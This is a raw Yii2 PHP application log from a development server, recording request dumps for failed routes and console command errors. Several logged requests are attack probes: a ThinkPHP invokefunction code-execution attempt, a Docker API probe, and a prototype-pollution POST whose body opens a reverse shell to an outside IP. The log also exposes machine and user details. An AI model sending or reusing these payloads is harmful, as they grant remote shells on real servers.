2026-01-28 13:40:34 [102.244.97.186][-][5aspd0h2duthqf5njvbv3di6h3][error][yii\web\HttpException:404] yii\base\InvalidRouteException: Unable to resolve the request "public/index.php". in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php:563
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('public/index.ph...', Array)
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#2 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#3 {main}

Next yii\web\NotFoundHttpException: Página no encontrada. in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php:124
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#1 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#2 {main}
2026-01-28 13:40:34 [102.244.97.186][-][5aspd0h2duthqf5njvbv3di6h3][info][application] $_GET = [
    's' => '/index/\\think\\app/invokefunction'
    'function' => 'call_user_func_array'
    'vars' => [
        0 => 'md5'
        1 => [
            0 => 'Hello'
        ]
    ]
]

$_POST = []

$_FILES = []

$_COOKIE = []

$_SESSION = [
    '__flash' => []
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => '201.209.50.227:80'
    'HTTP_UPGRADE_INSECURE_REQUESTS' => '1'
    'HTTP_ACCEPT' => '*/*'
    'HTTP_USER_AGENT' => 'libredtail-http'
    'HTTP_CONNECTION' => 'keep-alive'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at 201.209.50.227 Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => '201.209.50.227'
    'SERVER_ADDR' => '192.168.1.120'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '102.244.97.186'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '45724'
    'REDIRECT_URL' => '/public/index.php'
    'REDIRECT_QUERY_STRING' => 's=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => 's=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello'
    'REQUEST_URI' => '/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769622034.1929
    'REQUEST_TIME' => 1769622034
]
2026-01-28 13:40:41 [102.244.97.186][-][rn22k619keij4i30jtunsqs5t2][error][yii\web\HttpException:404] yii\base\InvalidRouteException: Unable to resolve the request "containers/json". in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php:563
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('containers/json', Array)
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#2 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#3 {main}

Next yii\web\NotFoundHttpException: Página no encontrada. in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php:124
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#1 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#2 {main}
2026-01-28 13:40:41 [102.244.97.186][-][rn22k619keij4i30jtunsqs5t2][info][application] $_GET = []

$_POST = []

$_FILES = []

$_COOKIE = []

$_SESSION = [
    '__flash' => []
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => '201.209.50.227:80'
    'HTTP_UPGRADE_INSECURE_REQUESTS' => '1'
    'HTTP_ACCEPT' => '*/*'
    'HTTP_USER_AGENT' => 'libredtail-http'
    'HTTP_CONNECTION' => 'keep-alive'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at 201.209.50.227 Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => '201.209.50.227'
    'SERVER_ADDR' => '192.168.1.120'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '102.244.97.186'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '45724'
    'REDIRECT_URL' => '/containers/json'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/containers/json'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769622041.2382
    'REQUEST_TIME' => 1769622041
]
2026-01-28 13:41:48 [193.142.147.209][-][pa7au1nljsrm9cp17an7camsd9][error][yii\web\HttpException:400] yii\web\BadRequestHttpException: Incapaz de verificar los datos enviados. in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Controller.php:346
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(195): yii\web\Controller->beforeAction(Object(yii\base\InlineAction))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('index', Array)
#2 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('site/index', Array)
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#4 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#5 {main}
2026-01-28 13:41:48 [193.142.147.209][-][pa7au1nljsrm9cp17an7camsd9][info][application] $_GET = []

$_POST = [
    0 => '{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_prefix\":\"var n=process.mainModule.require(\'net\'),c=process.mainModule.require(\'child_process\'),s=c.spawn(\'/bin/sh\',[]),cl=new n.Socket();cl.connect(12323,\'193.142.147.209\',()=>{cl.pipe(s.stdin);s.stdout.pipe(cl);s.stderr.pipe(cl);});\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}'
    1 => '\"$@0\"'
]

$_FILES = []

$_COOKIE = []

$_SESSION = [
    '__flash' => []
]

$_SERVER = [
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => '201.209.50.227:80'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    'CONTENT_LENGTH' => '623'
    'CONTENT_TYPE' => 'multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad'
    'HTTP_NEXT_ACTION' => 'x'
    'HTTP_ACCEPT_ENCODING' => 'gzip'
    'HTTP_CONNECTION' => 'close'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at 201.209.50.227 Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => '201.209.50.227'
    'SERVER_ADDR' => '192.168.1.120'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '193.142.147.209'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '41358'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'POST'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769622108.0763
    'REQUEST_TIME' => 1769622108
]
2026-01-28 18:49:43 [-][-][-][error][Error] Error: Undefined constant yii\helpers\Console::FG_WHITE in C:\xampp\htdocs\planealo_desarrollo\commands\RouteDiagnoseController.php:36
Stack trace:
#0 [internal function]: app\commands\RouteDiagnoseController->actionIndex()
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\InlineAction.php(66): call_user_func_array(Array, Array)
#2 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(197): yii\base\InlineAction->runWithParams(Array)
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\console\Controller.php(186): yii\base\Controller->runAction('', Array)
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\console\Controller->runAction('', Array)
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\console\Application.php(183): yii\base\Module->runAction('route-diagnose', Array)
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\console\Application.php(150): yii\console\Application->runAction('route-diagnose', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\console\Application->handleRequest(Object(yii\console\Request))
#8 C:\xampp\htdocs\planealo_desarrollo\yii(20): yii\base\Application->run()
#9 {main}
2026-01-28 18:49:42 [-][-][-][info][application] $_GET = []

$_POST = []

$_FILES = []

$_COOKIE = []

$_SERVER = [
    'ACLOCAL_PATH' => '/mingw64/share/aclocal:/usr/share/aclocal'
    'ALLUSERSPROFILE' => 'C:\\ProgramData'
    'APPDATA' => 'C:\\Users\\BlackOwl\\AppData\\Roaming'
    'COMMONPROGRAMFILES' => 'C:\\Program Files\\Common Files'
    'CommonProgramFiles(x86)' => 'C:\\Program Files (x86)\\Common Files'
    'CommonProgramW6432' => 'C:\\Program Files\\Common Files'
    'COMPUTERNAME' => 'DESKTOP-KU4M9D4'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'CONFIG_SITE' => '/etc/config.site'
    'DISPLAY' => 'needs-to-be-defined'
    'EXEPATH' => 'C:\\Program Files\\Git'
    'GIT_LFS_PATH' => 'C:\\Program Files\\Git LFS'
    'HOME' => 'C:\\Users\\BlackOwl'
    'HOMEDRIVE' => 'C:'
    'HOMEPATH' => '\\Users\\BlackOwl'
    'HOSTLANG' => 'es_ES.UTF-8'
    'HOSTNAME' => 'DESKTOP-KU4M9D4'
    'HOSTTERM' => 'xterm'
    'INFOPATH' => '/mingw64/local/info:/mingw64/share/info:/usr/local/info:/usr/share/info:/usr/info:/share/info'
    'LC_CTYPE' => 'es_ES.UTF-8'
    'LOCALAPPDATA' => 'C:\\Users\\BlackOwl\\AppData\\Local'
    'LOGONSERVER' => '\\\\DESKTOP-KU4M9D4'
    'MANPATH' => '/mingw64/local/man:/mingw64/share/man:/usr/local/man:/usr/share/man:/usr/man:/share/man'
    'MINGW_CHOST' => 'x86_64-w64-mingw32'
    'MINGW_PACKAGE_PREFIX' => 'mingw-w64-x86_64'
    'MINGW_PREFIX' => '/mingw64'
    'MSYSTEM' => 'MINGW64'
    'MSYSTEM_CARCH' => 'x86_64'
    'MSYSTEM_CHOST' => 'x86_64-w64-mingw32'
    'MSYSTEM_PREFIX' => '/mingw64'
    'NUMBER_OF_PROCESSORS' => '4'
    'OLDPWD' => '/c/xampp/htdocs'
    'OneDrive' => 'C:\\Users\\BlackOwl\\OneDrive'
    'ORIGINAL_PATH' => 'C:\\Program Files\\Git\\mingw64\\bin;C:\\Program Files\\Git\\usr\\bin;C:\\Users\\BlackOwl\\bin;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'ORIGINAL_TEMP' => '/tmp'
    'ORIGINAL_TMP' => '/tmp'
    'OS' => 'Windows_NT'
    'PATH' => 'C:\\Users\\BlackOwl\\bin;C:\\Program Files\\Git\\mingw64\\bin;C:\\Program Files\\Git\\usr\\local\\bin;C:\\Program Files\\Git\\usr\\bin;C:\\Program Files\\Git\\usr\\bin;C:\\Program Files\\Git\\mingw64\\bin;C:\\Program Files\\Git\\usr\\bin;C:\\Users\\BlackOwl\\bin;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin;C:\\Program Files\\Git\\usr\\bin\\vendor_perl;C:\\Program Files\\Git\\usr\\bin\\core_perl'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'PKG_CONFIG_PATH' => '/mingw64/lib/pkgconfig:/mingw64/share/pkgconfig'
    'PKG_CONFIG_SYSTEM_INCLUDE_PATH' => '/mingw64/include'
    'PKG_CONFIG_SYSTEM_LIBRARY_PATH' => '/mingw64/lib'
    'PLINK_PROTOCOL' => 'ssh'
    'PROCESSOR_ARCHITECTURE' => 'AMD64'
    'PROCESSOR_IDENTIFIER' => 'Intel64 Family 6 Model 78 Stepping 3, GenuineIntel'
    'PROCESSOR_LEVEL' => '6'
    'PROCESSOR_REVISION' => '4e03'
    'ProgramData' => 'C:\\ProgramData'
    'PROGRAMFILES' => 'C:\\Program Files'
    'ProgramFiles(x86)' => 'C:\\Program Files (x86)'
    'ProgramW6432' => 'C:\\Program Files'
    'PS1' => '\\[\\033]0;$TITLEPREFIX:$PWD\\007\\]\\n\\[\\033[32m\\]\\u@\\h \\[\\033[35m\\]$MSYSTEM \\[\\033[33m\\]\\w\\[\\033[36m\\]`__git_ps1`\\[\\033[0m\\]\\n$ '
    'PSModulePath' => 'C:\\Program Files\\WindowsPowerShell\\Modules;C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules'
    'PUBLIC' => 'C:\\Users\\Public'
    'PWD' => '/c/xampp/htdocs/planealo_desarrollo'
    'SESSIONNAME' => 'Console'
    'SHELL' => 'C:\\Program Files\\Git\\usr\\bin\\bash.exe'
    'SHLVL' => '1'
    'SSH_ASKPASS' => '/mingw64/bin/git-askpass.exe'
    'SYSTEMDRIVE' => 'C:'
    'SYSTEMROOT' => 'C:\\Windows'
    'TEMP' => 'C:\\Users\\BlackOwl\\AppData\\Local\\Temp'
    'TERM_PROGRAM' => 'mintty'
    'TERM_PROGRAM_VERSION' => '3.7.9'
    'TMP' => 'C:\\Users\\BlackOwl\\AppData\\Local\\Temp'
    'TMPDIR' => 'C:\\Users\\BlackOwl\\AppData\\Local\\Temp'
    'USERDOMAIN' => 'DESKTOP-KU4M9D4'
    'USERDOMAIN_ROAMINGPROFILE' => 'DESKTOP-KU4M9D4'
    'USERNAME' => 'BlackOwl'
    'USERPROFILE' => 'C:\\Users\\BlackOwl'
    'WINDIR' => 'C:\\Windows'
    'WSLENV' => 'HOSTTERM::HOSTLANG'
    '_' => '/usr/bin/winpty'
    'PHP_SELF' => 'yii'
    'SCRIPT_NAME' => 'yii'
    'SCRIPT_FILENAME' => 'yii'
    'PATH_TRANSLATED' => 'yii'
    'DOCUMENT_ROOT' => ''
    'REQUEST_TIME_FLOAT' => 1769622582.6558
    'REQUEST_TIME' => 1769622582
    'argv' => [
        0 => 'yii'
        1 => 'route-diagnose'
    ]
    'argc' => 2
]
2026-01-28 18:50:39 [-][-][-][error][Error] Error: Undefined constant yii\helpers\Console::FG_WHITE in C:\xampp\htdocs\planealo_desarrollo\commands\RouteDiagnoseController.php:38
Stack trace:
#0 [internal function]: app\commands\RouteDiagnoseController->actionIndex()
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\InlineAction.php(66): call_user_func_array(Array, Array)
#2 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(197): yii\base\InlineAction->runWithParams(Array)
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\console\Controller.php(186): yii\base\Controller->runAction('', Array)
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\console\Controller->runAction('', Array)
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\console\Application.php(183): yii\base\Module->runAction('route-diagnose', Array)
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\console\Application.php(150): yii\console\Application->runAction('route-diagnose', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\console\Application->handleRequest(Object(yii\console\Request))
#8 C:\xampp\htdocs\planealo_desarrollo\yii(20): yii\base\Application->run()
#9 {main}
2026-01-28 18:50:38 [-][-][-][info][application] $_GET = []

$_POST = []

$_FILES = []

$_COOKIE = []

$_SERVER = [
    'ACLOCAL_PATH' => '/mingw64/share/aclocal:/usr/share/aclocal'
    'ALLUSERSPROFILE' => 'C:\\ProgramData'
    'APPDATA' => 'C:\\Users\\BlackOwl\\AppData\\Roaming'
    'COMMONPROGRAMFILES' => 'C:\\Program Files\\Common Files'
    'CommonProgramFiles(x86)' => 'C:\\Program Files (x86)\\Common Files'
    'CommonProgramW6432' => 'C:\\Program Files\\Common Files'
    'COMPUTERNAME' => 'DESKTOP-KU4M9D4'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'CONFIG_SITE' => '/etc/config.site'
    'DISPLAY' => 'needs-to-be-defined'
    'EXEPATH' => 'C:\\Program Files\\Git'
    'GIT_LFS_PATH' => 'C:\\Program Files\\Git LFS'
    'HOME' => 'C:\\Users\\BlackOwl'
    'HOMEDRIVE' => 'C:'
    'HOMEPATH' => '\\Users\\BlackOwl'
    'HOSTLANG' => 'es_ES.UTF-8'
    'HOSTNAME' => 'DESKTOP-KU4M9D4'
    'HOSTTERM' => 'xterm'
    'INFOPATH' => '/mingw64/local/info:/mingw64/share/info:/usr/local/info:/usr/share/info:/usr/info:/share/info'
    'LC_CTYPE' => 'es_ES.UTF-8'
    'LOCALAPPDATA' => 'C:\\Users\\BlackOwl\\AppData\\Local'
    'LOGONSERVER' => '\\\\DESKTOP-KU4M9D4'
    'MANPATH' => '/mingw64/local/man:/mingw64/share/man:/usr/local/man:/usr/share/man:/usr/man:/share/man'
    'MINGW_CHOST' => 'x86_64-w64-mingw32'
    'MINGW_PACKAGE_PREFIX' => 'mingw-w64-x86_64'
    'MINGW_PREFIX' => '/mingw64'
    'MSYSTEM' => 'MINGW64'
    'MSYSTEM_CARCH' => 'x86_64'
    'MSYSTEM_CHOST' => 'x86_64-w64-mingw32'
    'MSYSTEM_PREFIX' => '/mingw64'
    'NUMBER_OF_PROCESSORS' => '4'
    'OLDPWD' => '/c/xampp/htdocs'
    'OneDrive' => 'C:\\Users\\BlackOwl\\OneDrive'
    'ORIGINAL_PATH' => 'C:\\Program Files\\Git\\mingw64\\bin;C:\\Program Files\\Git\\usr\\bin;C:\\Users\\BlackOwl\\bin;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'ORIGINAL_TEMP' => '/tmp'
    'ORIGINAL_TMP' => '/tmp'
    'OS' => 'Windows_NT'
    'PATH' => 'C:\\Users\\BlackOwl\\bin;C:\\Program Files\\Git\\mingw64\\bin;C:\\Program Files\\Git\\usr\\local\\bin;C:\\Program Files\\Git\\usr\\bin;C:\\Program Files\\Git\\usr\\bin;C:\\Program Files\\Git\\mingw64\\bin;C:\\Program Files\\Git\\usr\\bin;C:\\Users\\BlackOwl\\bin;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin;C:\\Program Files\\Git\\usr\\bin\\vendor_perl;C:\\Program Files\\Git\\usr\\bin\\core_perl'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'PKG_CONFIG_PATH' => '/mingw64/lib/pkgconfig:/mingw64/share/pkgconfig'
    'PKG_CONFIG_SYSTEM_INCLUDE_PATH' => '/mingw64/include'
    'PKG_CONFIG_SYSTEM_LIBRARY_PATH' => '/mingw64/lib'
    'PLINK_PROTOCOL' => 'ssh'
    'PROCESSOR_ARCHITECTURE' => 'AMD64'
    'PROCESSOR_IDENTIFIER' => 'Intel64 Family 6 Model 78 Stepping 3, GenuineIntel'
    'PROCESSOR_LEVEL' => '6'
    'PROCESSOR_REVISION' => '4e03'
    'ProgramData' => 'C:\\ProgramData'
    'PROGRAMFILES' => 'C:\\Program Files'
    'ProgramFiles(x86)' => 'C:\\Program Files (x86)'
    'ProgramW6432' => 'C:\\Program Files'
    'PS1' => '\\[\\033]0;$TITLEPREFIX:$PWD\\007\\]\\n\\[\\033[32m\\]\\u@\\h \\[\\033[35m\\]$MSYSTEM \\[\\033[33m\\]\\w\\[\\033[36m\\]`__git_ps1`\\[\\033[0m\\]\\n$ '
    'PSModulePath' => 'C:\\Program Files\\WindowsPowerShell\\Modules;C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules'
    'PUBLIC' => 'C:\\Users\\Public'
    'PWD' => '/c/xampp/htdocs/planealo_desarrollo'
    'SESSIONNAME' => 'Console'
    'SHELL' => 'C:\\Program Files\\Git\\usr\\bin\\bash.exe'
    'SHLVL' => '1'
    'SSH_ASKPASS' => '/mingw64/bin/git-askpass.exe'
    'SYSTEMDRIVE' => 'C:'
    'SYSTEMROOT' => 'C:\\Windows'
    'TEMP' => 'C:\\Users\\BlackOwl\\AppData\\Local\\Temp'
    'TERM_PROGRAM' => 'mintty'
    'TERM_PROGRAM_VERSION' => '3.7.9'
    'TMP' => 'C:\\Users\\BlackOwl\\AppData\\Local\\Temp'
    'TMPDIR' => 'C:\\Users\\BlackOwl\\AppData\\Local\\Temp'
    'USERDOMAIN' => 'DESKTOP-KU4M9D4'
